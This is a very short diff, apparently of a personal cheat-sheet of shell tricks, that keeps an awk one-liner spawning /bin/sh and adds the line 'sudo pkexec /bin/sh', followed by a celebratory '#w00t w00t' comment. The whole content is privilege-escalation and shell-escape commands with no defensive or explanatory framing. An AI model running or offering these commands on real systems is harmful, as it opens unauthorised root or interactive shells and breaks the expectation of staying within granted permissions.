@@ -1,2 +1,3 @@
 awk 'BEGIN {system("/bin/sh")}'
+sudo pkexec /bin/sh
 #w00t w00t
